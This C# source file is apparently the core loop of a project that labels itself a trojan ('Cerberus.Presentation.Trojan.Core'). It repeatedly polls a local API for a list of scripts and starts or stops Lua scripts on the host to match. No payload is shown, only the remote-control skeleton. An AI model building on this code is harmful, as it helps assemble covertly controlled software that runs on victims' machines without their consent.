using Cerberus.Domain.ApiService.ApiService;
using Cerberus.Domain.Models.Machine;
using Cerberus.Presentation.Trojan.Core;
using RestSharp;

public class Program
{
    private static bool Run = true;
    public static LuaResultApiService _luaResultApiService = new LuaResultApiService(new RestClient("http://localhost:5108/api"));
    private static UserApiService _userService = new UserApiService(new RestClient("http://localhost:5108/api"));
    private static ComputerScriptApiService _scriptService = new ComputerScriptApiService(new RestClient("http://localhost:5108/api"));
    private static LuaScriptManager _scriptManager = new LuaScriptManager();

    private static async Task<int> WorkOnScripts()
    {

        while (Run)
        {

            List<ComputerScript> apiScripts = await _scriptService.GetComputerScripts();

            foreach(string scriptName in _scriptManager.GetAllScripts())
            {

                ComputerScript? _script = apiScripts.FirstOrDefault(script => script.Name == scriptName);
                //This script is here!
                if (_script != null)
                {

                    if (_script.Active)
                    {

                        if (!Program._scriptManager.IsScriptActive(scriptName))
                        {
                            _ = Program._scriptManager.StartScriptAsync(scriptName);
                        }

                    }
                    else
                    {

                        if (Program._scriptManager.IsScriptActive(scriptName))
                        {
                            Program._scriptManager.StopScript(scriptName);
                        }
                        

                    }

                }
                else
                {

                    //Return to api that this script is not present!

                }

            }


        }


        return 1;

    } 


    private static async Task Main(string[] args)
    {

        _scriptManager.LoadScripts();
        _ = await Program.WorkOnScripts();

    }
}